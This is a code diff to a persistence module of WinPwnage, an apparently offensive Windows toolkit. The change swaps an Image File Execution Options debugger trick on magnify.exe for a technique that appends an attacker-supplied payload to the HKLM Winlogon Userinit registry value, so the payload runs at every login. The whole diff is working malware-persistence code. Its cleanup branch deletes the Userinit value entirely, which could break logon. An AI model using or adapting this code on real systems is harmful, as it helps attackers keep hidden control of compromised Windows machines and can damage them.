@@ -1,9 +1,10 @@
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
+import os
 
 persistMethod4_info = {
-	"Description": "Persistence using image file execution option and magnifier.exe",
-	"Method": "Image File Execution Options debugger and accessibility application",
+	"Description": "Persistence using userinit key",
+	"Method": "Registry key (UserInit) manipulation",
 	"Id": "4",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
@@ -18,30 +19,22 @@ def persistMethod4(payload, name="", add=True):
 		print_error("Cannot proceed, we are not elevated")
 		return False
 
-	if "64" in information().architecture():
-		magnify_key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
-	else:
-		magnify_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
-
-	accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
-
+	winlogon = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 	if add:
 		if payloads().exe(payload):
-			if registry().modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=payloads().exe(payload)[1], create=True):
-				print_success("Successfully created Debugger key containing payload ({})".format(payloads().exe(payload)[1]))
-				if registry().modify_key(hkey="hklm", path=accessibility_key, name="Configuration", value="magnifierpane", create=True):
-					print_success("Successfully installed persistence, payload will run at login")
-					return True
-			print_error("Unable to install persistence")
-			return False
+			p = os.path.join(information().system_directory(), "userinit.exe," + payloads().exe(payload)[1])
+			if registry().modify_key(hkey="hklm", path=winlogon, name="Userinit", value=p):
+				print_success("Successfully created Userinit key containing payload ({})".format(payloads().exe(payload)[1]))
+				print_success("Successfully installed persistence, payload will run at login")
+			else:
+				print_error("Unable to install persistence")
+				return False
 		else:
 			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		if registry().remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
-			if registry().remove_key(hkey="hklm", path=magnify_key, delete_key=True):
-				print_success("Successfully removed persistence")
-				return True
-
-		print_error("Unable to remove persistence")
-		return False
+		if registry().remove_key(hkey="hklm", path=winlogon, name="Userinit"):
+			print_success("Successfully removed persistence")
+		else:
+			print_error("Unable to remove persistence")
+			return False
